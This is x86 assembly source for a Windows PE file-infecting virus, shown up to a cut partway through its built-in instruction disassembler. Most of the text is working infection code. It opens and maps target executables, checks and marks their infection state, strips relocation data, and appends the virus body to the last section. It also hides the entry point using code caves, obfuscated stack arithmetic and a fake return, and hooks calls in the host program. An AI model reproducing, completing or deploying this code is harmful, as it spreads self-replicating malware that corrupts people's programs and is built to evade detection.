   ; Objective of this file is     1ø if the file exist
   ;                   2ø if the file can be opened
   ;                   Yes -   3ø Save the time state
   ;               4øOpen file
   ;
   ;               And then infect it
   ;
   ; The virus have a mini routine that scan the stack in order to find a known
   ; value and then use the precedent values to resize and remap the file
   ;

   E_Infect:

   mov     edx,esp
   sub     esp,512
   mov     edx,esp

   push    esi

   push    edx
   push    esi
   I_apicall    04A5BD785h,0               ; FindFirst

   pop     esi

   cmp     eax,-1
   jne     Infectit1

   add     esp,512
   setval  error, -1

   jmp wefinished

   Infectit1:

   push        eax
   I_apicall   0A8793DEAh,0                ; Find Close

   sub     esp,12
   mov     edx,esp
   mov     dword ptr [edx],12
   mov     dword ptr [edx+4],0
   mov     dword ptr [edx+4+4],0

   pushad

   push        esi

   loadpointer     edx,SFCLib,api48
   mov     ecx,0
   mov     eax,2
   ISyscall    LoadLib

   cmp     eax,0
   pop     edx             ; restore name
   je      skiptest

   push        eax

   push        edx
   push        0
   I_apicall   0D23E5722h,2            ; SfcIsFileProtected

   pop     edx
   push        eax

   push        edx
   I_apicall   1740CD46h,0         ; freelibraryA

   pop     eax

   cmp     eax,0
   je      skiptest

   popad

   add         esp,512+12
   setval      error,-95           ; file protected
   jmp     wefinished

   skiptest:

   popad

   push    edx

   push    0
   push    80h
   push    3                   ; OPEN_EXISTING
   push    edx
   push    1                   ; FILE_SHARE_READ
   push    80000000h or 40000000h          ; GENERIC_READ or GENERIC_WRITE
   push    esi
   I_apicall    193E83EEh, 0           ; CreateFileA

   pop     edx

   cmp     eax,-1
   jne     Infectit2

   add     esp,512+12
   setval  error,2
   jmp wefinished

   Infectit2:

   push    21021981
   push    eax

   push    eax
   push    edx

   push    0
   push    eax
   I_apicall   3508A453h,0             ; GetFileSizeA

   pop edx
   pop ebx

   push    0
   push    eax
   push    0
   push    4
   push    edx
   push    ebx
   I_apicall    97E2AF98h,0            ; CreateFileMappingA

   push    eax

   push    0
   push    0
   push    0
   push    000F001Fh
   push    eax
   I_apicall    3D547DB1h,0            ; MapViewOfFile

   push    eax
   neg     eax
   push    eax
   neg eax

   call    testinf

   cmp     eax,0
   jne     skipinf

   call    killrelocs

   getval  virsize
   push    eax

   setval  virsize,banksize
   call    dropcode

   pop eax
   setval  virsize,eax

   call    updatecode

   call    HideEP

   cmp eax,-1
   je  goaway5

   call    hookres
   call    RebuildLoaded
   jmp     goaway5

   skipinf:

   cmp     eax,1
   jne     goaway5

   call    updatecode
   jmp     goaway5

   ;
   ; testing infection
   ;

   testinf:

   mov esi,eax

   cmp word ptr [esi],'ZM'             ; exe ?
   je  itsexec

   setval  error, -16
   mov eax,-1
   ret

   itsexec:

   mov eax,dword ptr [esi+03Ch]
   lea edi,[eax+esi]

   cmp dword ptr [edi],'EP'                ; PE ?
   je  itsexec2

   setval  error, -17
   mov eax,-1
   ret

   itsexec2:

   bt  dword ptr [edi+22],12
   jc  notprog

   bt  dword ptr [edi+22],13               ; application ?
   jnc notprog

   setval  error, -18
   mov eax,-1
   ret

   notprog:

   movzx   edx,word ptr [edi+20]
   lea edx,[edi+edx+24]

   mov eax,dword ptr [edi+40]

   mov ecx,dword ptr [edx+12]
   add ecx,dword ptr [edx+8]

   cmp eax,ecx
   jb  thatsfine               ; entrypoint in code section ?

   setval  error, -19
   mov eax,-1
   ret

   thatsfine:

   push    edx

   mov eax,dword ptr [edi+8]
   mov ecx,24
   xor edx,edx
   div ecx

   cmp edx,0
   jne processinfection            ; not infected ?

   cmp byte ptr [edi-1],al
   jne processinfection

   pop edx

   mov eax,04000h
   add al,byte ptr [edi-2]         ; set file state infected

   setval  error, eax

   mov dl,al

   getval  version

   cmp dl,al                   ; for future flush
   jae doitright

   mov byte ptr [edi-2],dl
   mov eax,1                   ; reflush it !

   doitright:

   ret

   processinfection:

   cmp     dword ptr [edi+132],0           ; check that export is not
   jne damnthatit              ; null!

   setval  error,-25
   mov eax,-1
   ret

   damnthatit:

   inc eax
   mov byte ptr [edi-1],al

   xor edx,edx
   mul ecx
   mov dword ptr [edi+8],eax

   pop edx

   mov ecx,dword ptr [edx+16]          ; code section

   cmp ecx,dword ptr [edx+8]
   ja  allright                ; check code section normal
                           ; to use nulls at the end
   setval  error,-18

   mov eax,-1
   ret

   allright:

   getval  version                 ; set version

   mov byte ptr [edi-2],al

   xor eax,eax
   ret

   killrelocs:

   or  word ptr [edi+22], 1

   movzx   ecx,word ptr [edi+6]

   push    edx

   getitnow:

   mov dword ptr [edx+24],0
   mov dword ptr [edx+24+4],0          ; zero the reloc to each
   mov dword ptr [edx+24+8],0          ; section

   add edx,40

   loop    getitnow

   pop edx

   mov eax,dword ptr [edi+160]         ; zeroizing the
   cmp eax,0
   je  getthatnow

   call    RVA2Offset              ; reloc table

   push    edi

   mov ecx,dword ptr [edi+164]
   lea edi,[esi+eax]

   repz    stosb                   ; zero the section

   pop edi

   mov dword ptr [edi+160],0           ; zero the reloc size
   mov dword ptr [edi+164],0

   push    edx

   mov ebx,edx
   movzx   eax,word ptr [edi+6]
   xor edx,edx
   mov ecx,40
   dec eax
   mul ecx

   push    edi

   lea edi,[ebx+eax]

   cmp dword ptr [edi],'ler.'          ; kill section
   jne skipgetit

   mov ecx,40
   xor eax,eax

   repz    stosb                   ; zero it from disk

   pop edi
   dec word ptr [edi+06]
   push    edi
   skipgetit:

   pop edi
   pop edx

   getthatnow:

   ret

   dropcode:

   push    edx

   movzx   eax,word ptr [edi+06]           ; load number of section
   mov ecx,40                  ; size of section
   xor edx,edx
   dec eax
   mul ecx                 ; go to last section

   pop edx                 ; restore edx wich point
                           ; to start of section
   lea ebx,[edx+eax]

   or  byte ptr [ebx+36],01000000b     ; modify the segment state
   and byte ptr [ebx+36],1111111b
   or  byte ptr [ebx+36+3],10000000b

   getval  virsize                 ; load the size

   add eax,4
   add eax,dword ptr [ebx+8]

   xor edx,edx
   mov ecx,dword ptr [edi+60]
   div ecx                 ;
   inc eax
   xor edx,edx
   mul ecx                 ;

   mov edx,dword ptr [ebx+8]
   add edx,dword ptr [ebx+12]

   push    edx

   add edx,dword ptr [edi+52]          ; calculate were virus binary
   setval  dropplace,edx               ; is placed

   pop edx

   mov dword ptr [edi-10],edx          ; save it near "PE"

   mov edx,dword ptr [ebx+20]
   add edx,dword ptr [ebx+8]

   mov dword ptr [ebx+8], eax
   mov dword ptr [ebx+16], eax

   push    edx
   add eax,dword ptr [ebx+20]          ; now calculate exact size

   call    ResizeAndRemap              ; remap it!

   sub ebx,edi
   mov edi,dword ptr [esi+03Ch]
   add edi,esi
   add ebx,edi

   mov eax,dword ptr [ebx+8]

   xor edx,edx
   mov ecx,dword ptr [edi+56]
   div ecx
   inc eax
   xor edx,edx
   mul ecx

   mov dword ptr [ebx+8],eax           ; set the section size!

   add eax,dword ptr [ebx+12]
   mov dword ptr [edi+80],eax          ; set image size

   movzx   edx,word ptr [edi+20]
   lea edx,[edx+edi+24]

   pop eax

   mov dword ptr [edi-6],eax           ; set loaded size

   ret

   ;
   ; Hide Entry Point
   ;
   ;
   ; The idea,  well, as usal, a call or a jmp in the last section is very
   ; suspicious, here we use a program opcode in order to jump to our virus.
   ; You will tell me how if we don't use call/jmp, well, we will fake a ret
   ;
   ; The idea is the following:
   ;
   ;       PUSHAD                          <- this for restoring state
   ;       PUSH Imm
   ;       XOR dword ptr [esp], Imm
   ;       ADD dword ptr [esp], Imm
   ;       SUB dword ptr [esp], Imm
   ;       ROL/ROR dword ptr [esp],Imm
   ;       jmp to ret
   ;
   ; we have in fact two possibility, drop this code in alignment cave and/or
   ; drop in the end of code section, wich have often series of zeroes coz
   ; alignment
   ;

   HideEP:

   sub esp,24

   connectval  equ 0
   dispval     equ 4
   doomconstate    equ 8
   bottomoffset    equ 12
   upperoffset equ 16
   savecount   equ 20

   mov dword ptr [esp+bottomoffset],0          ; for linking
   mov dword ptr [esp+upperoffset],0
   mov dword ptr [esp+doomconstate],0

   mov eax,dword ptr [edi-10]
   add eax,dword ptr [edi+52]
   mov dword ptr [esp+dispval],eax         ; load code value

   mov     ebx,dword ptr [edx+20]
   add ebx,esi
   mov     ecx,dword ptr [edx+16]

   mov eax,dword ptr [edx]
   xor eax,dword ptr [edi+8]

   and eax,111111b
   inc eax

   sub esp,4

   getagetagain:

   inc ebx

   cmp byte ptr [ebx],0C3h         ; search for a ret inside the
   jne getagetagain5               ; code

   mov dword ptr [esp],ebx         ; it will be dead point

   dec eax
   cmp eax,0
   je  getagainfinish

   getagetagain5:

   loop    getagetagain

   getagainfinish:

   pop ebx
   call    Offset2RVA

   mov dword ptr [esp+connectval],ebx      ; set it to connect value

   mov     eax,5
   call    loaddropplace               ; search for a jump

   cmp eax,-1
   je  stopinfection

   call    makeaconnectjmp             ; place jump to there

   push    edx
   mov ecx,7
   mov eax,ebx
   sub eax,esi
   xor edx,edx
   div ecx

   mov eax,edx
   and eax,11b                 ; une valse … 3 temps

   cmp eax,0
   jne nonoprob11

   inc eax

   nonoprob11:

   mov ecx,eax
   pop edx

   weneedtogetit:

   mov dword ptr [esp+savecount],ecx

   mov     eax,14
   call    loaddropplace

   mov ecx,dword ptr [esp+savecount]

   cmp eax,-1
   je  stopinfection

   ; au premier temps de la valse

   mov eax,esi
   add eax,dword ptr [edx+20]
   mov eax,dword ptr [eax+ecx*8]

   add eax,dword ptr [edi+8]

   push    edx

   push    eax

   mov eax,esi
   add eax,dword ptr [edx+20]
   mov eax,dword ptr [eax+ecx*8+4]
   add eax,dword ptr [edi+8]

   mov ecx,3
   xor edx,edx
   div ecx

   pop eax

   mov byte ptr [ebx],081h         ; set an instruction
                           ; playing on stack
   cmp edx,0
   jne gotoneinst1

   mov byte ptr [ebx+1],04h
   sub dword ptr [esp+4+dispval],eax

   gotoneinst1:

   cmp edx,1
   jne gotoneinst2

   mov byte ptr [ebx+1],02Ch               ; add
   add dword ptr [esp+4+dispval],eax

   gotoneinst2:

   cmp edx,2
   jne gotoneinst3

   mov byte ptr [ebx+1],034h               ; sub
   xor dword ptr [esp+4+dispval],eax

   gotoneinst3:

   mov byte ptr [ebx+2],24h                ; xor
   mov dword ptr [ebx+3],eax
   add ebx,7

   pop edx

   call    makeaconnectjmp                 ; then connect a jmp
   sub dword ptr [esp+connectval], 7

   mov ecx,dword ptr [esp+savecount]

   dec ecx

   cmp ecx,0
   jne weneedtogetit                   ; x times done ?

   mov     eax,11
   call    loaddropplace                   ; search for a push

   cmp eax,-1
   je  stopinfection

   mov dword ptr [esp+doomconstate],ebx

   mov eax,dword ptr [esp+dispval]
   mov word ptr [ebx],6860h                ; pushad push

   mov dword ptr [ebx+2],eax
   add ebx,6
   call    makeaconnectjmp                 ; jmp to

   mov ebx,dword ptr [esp+doomconstate]

   sub ebx,esi
   sub ebx,dword ptr [edx+20]
   add ebx,dword ptr [edx+12]

   mov dword ptr [edi-10],ebx              ; set entrypoint

   stopinfection5:                     ; of this little
                               ; messing code
   add esp,24
   ret

   stopinfection:

   setval  error, -20
   jmp stopinfection5

   ; blop blop blop - - - - - - - - - - - - - - - - - - - - - - - - - - - -

   loaddropplace:

   push    eax
   call    loadcave
   pop eax

   cmp ebx,-1                      ; no cave ?
   jne returnme

   cmp dword ptr [esp+4+upperoffset],0         ; check for init
   jne setitright                  ; upper offset

   mov ecx,eax
   mov     ebx,dword ptr [edx+20]
   add     ebx,dword ptr [edx+16]
   add ebx,esi

   mov dword ptr [esp+4+upperoffset],ebx       ; ok

   setitright:

   cmp dword ptr [esp+4+doomconstate],0
   je  getthatmoo

   cmp dword ptr [esp+4+bottomoffset],0    ; no bottom offset?
   je  setitright0

   mov ebx,dword ptr [esp+4+bottomoffset]
   add eax,ebx
   cmp eax,dword ptr [esp+4+upperoffset]
   ja  caca1                   ; no collision betwenn bot
                           ; and upper offset
   mov dword ptr [esp+4+bottomoffset],eax

   jmp gotonextone1

   setitright0:

   mov ebx,dword ptr [esp+4+upperoffset]

   caca2:

   dec ebx
   cmp byte ptr [ebx],0            ; calculate dead space
   je  caca2

   inc ebx

   gotonextone:

   mov dword ptr [esp+4+bottomoffset],ebx
   add dword ptr [esp+4+bottomoffset],eax      ; load next bottom
   gotonextone1:                       ; offset
   mov dword ptr [esp+4+doomconstate],0
   jmp gothootme

   getthatmoo:

   inc dword ptr [esp+4+doomconstate]
   mov ebx,dword ptr [esp+4+upperoffset]
   mov ecx,eax
   inc ecx

   getthatmoo1:

   dec ebx
   cmp byte ptr [ebx],0
   jne caca1

   loop    getthatmoo1             ; calculate dead space

   inc ebx

   returnme:

   mov dword ptr [esp+4+upperoffset],ebx   ; set it

   gothootme:

   xor eax,eax
   ret

   caca1:

   mov eax,-1
   mov ebx,-1                  ; errorit
   ret

   loadcave:

   mov     ebx,dword ptr [edx+20]
   add     ebx,esi
   mov     ecx,dword ptr [edx+16]

   getonecave:

   cmp     dword ptr [ebx],0CCCCCCCCh          ; seek for int 3
   je      googoom                     ; places

   inc     ebx

   loop    getonecave

   mov     ebx,-1
   ret

   googoom:

   push    ecx
   push    ebx

   mov     ecx,eax

   getitsan:

   cmp     byte ptr [ebx],0CCh         ; watch if exact size
   jne     goawaycave

   inc     ebx

   loop    getitsan

   pop     ecx

   sub ebx,eax                 ; not found, search after

   pop     ecx

   ret

   goawaycave:             ; we got it

   pop     ecx
   sub     ecx,ebx
   neg     ecx
   add     ecx,dword ptr [esp]
   add     esp,4
   jmp     getonecave

   Offset2RVA:

   sub ebx,esi
   sub ebx,dword ptr [edx+20]
   add ebx,dword ptr [edx+12]

   ret

   makeaconnectjmp:

   push    ebx

   mov byte ptr [ebx],0E9h

   mov eax,ebx
   add ebx,5
   call    Offset2RVA              ; connect jumps

   cmp ebx,-1
   je  stopinfection

   push    ebx

   sub ebx,dword ptr [esp+4+4+4+connectval]
   neg ebx
   mov dword ptr [eax+1],ebx

   pop ebx
   sub ebx,5
   mov dword ptr [esp+4+4+connectval], ebx

   pop ebx

   ret

   hookres:

   pushad

   sub esp,20

   callcount   equ 0
   lastcall    equ 4
   fixstart    equ 8
   fixload     equ 12
   fixedx      equ 16

   mov dword ptr [esp+callcount],0     ; fix callcount value
   mov dword ptr [esp+lastcall],0      ; fix lastcall value
   mov dword ptr [esp+fixstart],esi        ; fix fixstart value
   mov dword ptr [esp+fixload],edi     ; fix fixload value
   mov dword ptr [esp+fixedx],edx      ; fix fixedx value

   ;push   edx
   ;push   esi

   mov eax,dword ptr [edi+128]
   call    RVA2Offset

   mov ecx,eax
   and eax,000001111111100000000b
   shr eax,6

   add eax,dword ptr [esi+ecx+16]      ; start of import
   add eax,dword ptr [edi+52]          ; eax = start of import

   mov ecx,dword ptr [edx+16]          ; start of code
   mov eax,dword ptr [edi+40]

   call    RVA2Offset
   add esi,eax

   mov ebp,edx
   mov ecx,2048

   loopitlong:

   push    ecx
   call    disasmit                    ; disasm instruction
   pop ecx

   dec ecx

   cmp ecx,0
   je  timetogiveup                    ; 2048 instruction
                               ; passed ?
   cmp eax,-1
   je  timetogiveup

   cmp ebx,iiRET
   jne contimetogiveup                 ; a ret found ?

   cmp dword ptr [esp+callcount],1
   ja  timetogiveup                    ; too much callcount ?

   cmp dword ptr [esp+callcount],0
   je  loopitlong                  ;

   mov esi,dword ptr [esp+lastcall]            ; set esi the call
                               ; originator
   mov dword ptr [esp+callcount],0
   mov dword ptr [esp+lastcall],0

   jmp loopitlong

   contimetogiveup:

   cmp eax,5
   jne loopitlong

   cmp ebx,iiJMP
   jne checkCALL                   ; if instruction was
                               ; a jump
   push    esi

   add esi,edx
   mov edx,dword ptr [esp+4+fixstart]          ; jump there then
   add edx,dword ptr [ebp+20]

   cmp edx,esi
   ja  jmpgoaway

   add edx,dword ptr [ebp+16]

   cmp edx,esi
   jb  jmpgoaway                   ; valid jump ?

   mov dword ptr [esp],esi

   jmpgoaway:

   pop esi

   checkCALL:

   cmp ebx,iiCALL              ; was a call ?
   jne loopitlong

   mov dword ptr [esp+lastcall],esi        ; set instruction
   inc dword ptr [esp+callcount]

   ;cmp    dword ptr [esp+callcount],1
   ;jne    loopitlong

   cmp dword ptr [esp+callcount],1
   ja  loopitlong

   add esi,edx                 ; not too low call, trace it!

   jmp loopitlong

   timetogiveup:

   mov eax,dword ptr [esp+4]
   mov edi,dword ptr [esp+fixload]     ; load the last call

   cmp eax,0
   je  skipthisoneP                ; noone ? bad news !

   mov ebx,dword ptr [eax-4]
   xchg    ebx,dword ptr [edi-10]          ; load the value

   mov eax,dword ptr [esp+lastcall]        ; make the last call
   sub eax,dword ptr [esp+fixstart]        ; linking to start of
   mov edx,dword ptr [esp+fixedx]      ; mini messing routine
   add eax,dword ptr [edx+12]          ; that is a linker to the
   sub eax,dword ptr [edx+20]          ; polymorphic entry

   sub eax,ebx
   neg     eax

   mov edx,dword ptr [esp+4]
   mov dword ptr [edx-4],eax

   skipthisoneP:

   add esp,20
   popad
   ret

   disasmit:
           sub esp,t4sizeof        ; just a simple disasm :)

           call    getnext5
   getnext5:   pop ebx
           lea ebx,[ebx+iitable-getnext5]

   mov edi,esp

   push    esi
   push    edi
   push    ebx
   call    tab@disasm
   pop ebx
   pop edi
   pop esi

   cmp dword ptr [esi],0
   jne retminusone

   mov eax,-1

   retminusone:

   movzx   ecx,byte ptr [edi+t4size]

   add esi,ecx

   cmp eax,-1
   je  retanyway

   movzx   eax,byte ptr  [edi+t4argum+t4argtype]
   mov ebx,dword ptr [edi+t4insoff]
   mov edx,dword ptr [edi+t4argum+t4argvalue]

   retanyway:

   add esp, t4sizeof
   ret

   ;
   ; This part of program should translate a binary into computable
   ; comprehensible structure, see table1
   ;
   ; esi = offset to instruction
   ; edi = offset to the t4 strucute
   ; ebx = offset to table
   ;   tab-4 structre
   ;
   ;       0 - prefixes
   t4prefix    equ 0
   ;       1 - w type.word type value
   t4word      equ 1
   ;       2 - o type.operand type value
   t4oper      equ 2
   ;       3 - r type.register value
   t4reg       equ 3
   ;       4 - m type.memory register value
   t4mem       equ 4
   ;       5 - s type.segment type value
   t4seg       equ 5
   ;       6 - c type.condition type value
   t4cond      equ 6
   ;       7 - codec value: 0 = 32 bit 1 = 16 bit
   t4codec     equ 7
   ;       8 - offset of instruction
   t4offset    equ 8
   ;
   ;       12 - operand 1 type: 0 = value, 1 = reg, 2 = mem,
   ;                       3 = extended, 4 = destination
   t4argum     equ 12
   t4argsizeof equ 8
   t4argum2    equ t4argum+t4argsizeof
   t4argtype   equ 0
   t4argsize   equ 1
   t4argextreg equ 2
   t4argvalsize    equ 3
   t4argvalue  equ 4
   ;+1     - 13 - affected size
   ;+2     - 14 - (if) extended value (… la intel: aabbbccc = b+(c*2^a)
   ;+3     - 15 - value size (1-2-4)
   ;+4     - 16 - value
   ;
   ;       20 - respect the same structure as upper
   ;           21-22-23-24
   ;
   ;       Offset designed for communication with other t4 modules
   ;
   ;       28 - offset from beginning of the table of the precise instr.
   t4taboff    equ t4argum + t4argsizeof + t4argsizeof
   ;       32 - offset from beginning of the table of the instruction
   t4insoff    equ t4taboff + 4
   ;       36 - offset from beginning of the table of the operand
   t4opoff     equ t4insoff +4
   ;       40 - cleaned instruction
   t4clean     equ t4opoff + 4
   ;       44 - instruction size (a byte)
   t4size      equ t4clean+4
   ;
   t4sizeof    equ t4size + 1

   tab@disasm:

   push    ebp
   sub     esp,16

   tab@valcounter          equ     8
   tab@origoff     equ 4
   tab@orignow         equ 0

   mov     ebp,ebx

   mov byte ptr [edi+t4prefix],0
   mov     dword ptr [edi+t4taboff],ebp                    ; set some datas
   mov     dword ptr [edi+t4offset],esi                    ; for further purpose

   xchg    ebp,esi
   mov     dword ptr [esp+tab@valcounter],0                ; make a counter
                                                           ; for operands loop
   testagainintable:

   cmp     byte ptr [esi],1
   jne     tab@skipprefix                                  ; don't analyze
                                                           ; prefixes operation
   mov     al,byte ptr [esi+1]

   cmp     byte ptr [ebp],al                               ; look if
   jne     tab@skipprefix0                                 ; we don't have
                                                           ; set it yet
   mov     cl,byte ptr [esp+tab@valcounter]                ; watch were
                                                           ; in table
   ror     byte ptr [edi+t4prefix],cl

   bt      dword ptr [edi+t4prefix],0                      ; have we set it?
   jc  tab@skipprefix0

   or      byte ptr [edi+t4prefix],1                       ; no, the set it
   rol     byte ptr [edi+t4prefix],cl

   mov esi,dword ptr [edi+t4taboff]
   mov byte ptr [esp+tab@valcounter],-1
   sub     esi,2                                           ; we need to

   inc     ebp                                             ; restart from the
                                                           ; begining
   tab@skipprefix0:                                        ; (to avoid such
                                                           ; 6666h anti dis)
   inc     dword ptr [esp+tab@valcounter]                  ; go again
   add     esi,2                                           ; take next entry
   jmp     testagainintable

   tab@skipprefix:

   movzx   eax,byte ptr [esi]                              ; load current
   mov     edx,eax                                         ; instruction
   and     eax,0F0h                                        ; in table
   and edx,00Fh
   ror     eax,4                                           ; load size/type

   mov     byte ptr [esp+tab@valcounter],al                ; save size

   push    esi

   cmp eax,4
   jne     allokay                                         ; check if 4

   dec     eax                                             ; +4 byte ins
   dec     eax                                             ; are saved on 2 :)

   allokay:

   mov     dword ptr [edi+t4opoff],esi                     ; save instruction
                                                           ; offset
   detect1:

   cmp     edx,0                                           ; check if we
   jne     detect2                                         ; have a zero
                                                           ; type
   mov     dword ptr [esp+4+tab@origoff],esi               ; (instruction)
   mov     dword ptr [esp+4+tab@orignow],esi               ; set instruction/
   mov     dword ptr [edi+t4insoff],esi                    ; argument as detect.

   mov     ebx,dword ptr [esi+eax+3]                       ; load argument
   add     esi,3                                           ; point to instruc.
   call    testentry                                       ; load instruction
   pop esi

   lea     esi,[esi+eax+7]                                 ; point to end of ins.

   detect2:

   cmp     edx,1                                           ; check for an inst
   jne     detect3                                         ; w/o operand

   mov     dword ptr [edi+t4insoff],esi                    ; then save ins

   mov     ebx,dword ptr [esp+4+tab@origoff]               ; save instr.
   mov     dword ptr [esp+4+tab@orignow],ebx               ; from the sliding(*)
   mov     ebx,dword ptr [ebx+eax+3]                       ; load operand
   inc esi
   call    testentry                                       ; check instruction
   pop esi

   lea esi,[esi+eax+1]

   detect3:

   cmp     edx,2                                           ; compare a variance
   jne     detect4                                         ; with instruct.

   mov dword ptr [edi+t4opoff],esi
   mov ebx,dword ptr [esi+eax+3]
   add     esi,3                                           ; point to instr.

   call    testentry                                       ; check ins.
   pop esi

   lea     esi,[esi+eax+7]                                 ; go to next instr.

   detect4:

   cmp edx,3
   jne detect5

   mov     ebx,dword ptr [esp+4+tab@orignow]               ; load operand
   mov dword ptr [edi+t4opoff],ebx
   mov ebx,dword ptr [ebx+eax+3]

   inc     esi                                             ; point to start
   call    testentry                                       ; of the table
   pop esi

   lea     esi,[esi+eax+1]                                 ; go to next

   detect5:

   add dword ptr [esp+tab@orignow],eax
   add     dword ptr [esp+tab@orignow],7                   ; save everything

   cmp     byte ptr [esi],-1                               ; check end of
   jne     tab@skipprefix                                  ; table

   xchg    esi,ebp
   add     esp,16                                          ; arrange stack
   pop     ebp                                             ; restore point.

   xor eax,eax
   dec     eax                                             ; return -1
   ret                                                     ; error code

   testentry:

   push    eax

   xor     eax,eax                                 ; nullify register buffer
   xor     ecx,ecx                                 ; nullify counter

   mov cl,byte ptr [esp+4+4+4+tab@valcounter]
   mov     byte ptr [edi+t4size],cl                ; get instruction size

   cmp cl,4
   jne dontdecit

   dec     ecx                                     ; if it's 4, then it should
   mov     byte ptr [edi+t4size],cl                ; be 3 (there's no > 3 bytes)

   dontdecit:

   xor     edx,edx                                 ;
   push    ecx

   tab@makeloop1:
   rol     edx, 8                                  ; load the binary
   rol     eax, 8                                  ;
   mov dl,0FFh
   mov     al,byte ptr [esi]                       ; load next entry
   inc esi
   loop    tab@makeloop1

   pop ecx
   cmp ecx,3
   jne     tab@dondonet                            ; if size was three

   mov     al,0Fh                                  ; put the last part

   tab@dondonet:

   mov ecx,dword ptr [ebp]
   and ecx,edx

   cmp ecx,0Fh
   je      tab@skipfoundit                                 ; skip analyzing
                                                           ;
   push    eax

   mov edx,ecx

   mov     dword ptr [edi+t4oper],0                        ; nullify flags
   mov dword ptr [edi+t4mem],0

   mov eax,011b
   call    getvalb
   mov byte ptr [edi+t4oper],cl            ; o type
   sub edx,eax

   mov eax,01b
   call    getvalb
   mov byte ptr [edi+t4word],cl            ; w type
   sub edx,eax

   mov eax,0111b
   call    getvalb
   mov byte ptr [edi+t4mem],cl             ; m type
   sub edx,eax

   mov eax,0111b
   call    getvalb
   mov byte ptr [edi+t4reg],cl             ; r type
   sub edx,eax

   mov eax,0111b
   call    getvalb
   mov byte ptr [edi+t4seg],cl             ; s type
   sub edx,eax

   mov eax,01111b
   call    getvalb
   mov byte ptr [edi+t4cond],cl            ; c type
   sub edx,eax

   pop ecx

   cmp ecx,edx
   je      tab@wefoundit                                   ; is it okay

   tab@skipfoundit:

   xor edx,edx
   pop     eax                                             ; restore eax

   ret

   getvalb:

   push    edx
   push    ebx

   and     ebx,11111b                              ; see flags location

   shr     dword ptr [esp],5                       ; load next location in flag
   mov cl,bl

   cmp bl,0
   je      tab@nullskip0                           ; if zero, dont apply

   xchg    eax,edx                                 ;

   tab@doitagain:

   ror     edx,1                                   ; shift bit to big endian
                                                   ; and shift of the size
   cmp     dl,0                                    ; bit length size
   jne tab@doitagain

   xchg    al,ah
   ror     eax,16                                  ; pass to big endian
   xchg    al,ah

   ror     edx,cl                                  ; go to the pos.
   and     eax,edx                                 ; nullify it

   push    eax                                     ; save it

   xchg    al,ah
   ror eax,16
   xchg    al,ah                                   ; and then come back

   pop ecx

   doitagainp:

   rol ecx,1
   rol     edx,1                                   ; go to next

   cmp edx,0FFh
   ja      doitagainp                              ; watch it

   pop ebx
   pop     edx                                     ; return with eax = value
   ret

   tab@nullskip0:

   pop ebx
   pop edx
   xor     eax,eax                                 ; finish it
   mov     cl,-1                                   ; return with -1
   ret

   tab@wefoundit:

   mov     dword ptr [edi+t4clean],edx             ; save the clean instruction

   pop esi
   pop esi
   pop esi                                         ; restore stack

   mov eax,dword ptr [edi+t4taboff]
   sub     dword ptr [edi+t4taboff],esi            ; save the instruction
   neg dword ptr [edi+t4taboff]

   sub     dword ptr [edi+t4insoff],eax            ; fix up instruction off
   sub     dword ptr [edi+t4opoff],eax             ; and operation offset

   mov     esi,dword ptr [esp+tab@orignow]         ; load attrib fixed

   movzx   eax,byte ptr [edi+t4size]               ; get instruction size
   add     ebp,eax                                 ; add to ebp

   mov     al,byte ptr [esi+1]                     ;
   push    esi
   lea     esi,[edi+t4argum]                       ; load 1st argument
   call    getoperand
   pop esi

   push    esi
   mov     al,byte ptr [esi+2]                     ; load 2nd argument
   lea esi,[edi+t4argum2]
   call    getoperand
   pop esi

   sub     ebp,dword ptr [edi+t4offset]            ; render instruction size
   mov     eax,ebp                                 ; now
   mov byte ptr [edi+t4size],al

   add esp,16
   pop ebp

   ret

   getoperand:

   mov     dword ptr [esi],-1                      ;
   mov     dword ptr [esi+4],-1                    ;

   cmp al,0
   jne     thatnotme0                              ; check if arg is null

   mov byte ptr [esi+t4argtype],-1

   ret

   thatnotme0:

   xor ecx,ecx
   mov     byte ptr [esi+t4argtype],1              ; set as register

   cmp     al,AccWord                              ; pay attention to
   ja      notAcc                                  ; accumulators

   mov     dl,0                                    ; set the size

   cmp al,Acc
   jne getother

   inc     dl                                      ; size is may be 8 bit

   getother:

   call    getsize                                 ; load the register size
   mov     byte ptr [esi+t4argsize],dl             ;
   mov     byte ptr [esi+t4argextreg],0            ;
   ret

   notAcc:

   cmp     al,DX0                                  ; check if we have DX
   jne notDX0                  ; as ex OUT

   mov byte ptr [esi+t4argsize],2
   mov byte ptr [esi+t4argextreg],2        ; pseudo construction

   ret

   notDX0:

   cmp al,CL0
   jne notCL0                  ; check if we have a CL comp.

   mov byte ptr [esi+t4argsize],1      ; as exemple
   mov byte ptr [esi+t4argextreg],1

   ret

   notCL0:

   cmp al,RegWord              ; watch if we need a register
   ja  notreg

   mov dl,byte ptr [edi+t4reg]
   mov byte ptr [esi+t4argextreg],dl       ; set reg value

   metestit:

   mov edx,4

   cmp al,Reg32                ; watch register size
   je  fixit

   mov edx,2

   cmp al,Reg16
   je  fixit

   mov edx,1

   cmp al,Reg8
   je  fixit

   xor dl,dl

   cmp al,RegWord
   jne skipincit

   inc dl

   skipincit:

   call    getsize             ; if not checked, detect it

   fixit:

   mov     byte ptr [esi+t4argsize],dl     ; fix reg size
   ret

   notreg:

   xor ecx,ecx             ;

   mov byte ptr [esi+t4argtype],0  ; set then we have a value

   cmp al,d1
   jne notD1               ; watch if the value is not by def 1.

   mov     byte ptr [esi+t4argsize],1
   mov     byte ptr [esi+t4argvalsize],1
   mov     dword ptr [esi+t4argvalue],1
   ret

   notD1:

   cmp al,Imm32            ; check if we have a calssic Imm
   ja  notImm

   Gotimm:

   sub al,Imm32-Reg32
   call    metestit            ; self detect size

   loadit:

   cmp dl,1
   jne doitbt              ; fill value depending the size

   mov al,byte ptr [ebp]
   mov     byte ptr [esi+t4argvalue],al

   doitbt:

   cmp dl,2
   jne doitbt2

   mov ax,word ptr [ebp]
   mov     word ptr [esi+t4argvalue],ax    ; copy word

   doitbt2:

   cmp dl,4
   jne additanyway         ; check dword

   mov eax,dword ptr [ebp]
   mov     dword ptr [esi+t4argvalue],eax  ; copy it

   additanyway:

   mov     byte ptr [esi+t4argvalsize],dl
   add ebp,edx                 ; add to instruction ptr
   ret                     ; thats all folks

   ; Meeeeeeeeeeeeeeeeeeemory! ---------------------------------------------

   notImm:

   Thatsmem1:

   mov byte ptr [esi+t4argtype],2      ; fill as it was memoery

   cmp     eax,MemWord
   ja  notMem

   Thatsmem:

   sub eax,MemWord-RegWord         ; load memory size
   call    metestit

   mov al,byte ptr [edi+t4mem]
   mov     byte ptr [esi+t4argextreg],al       ;

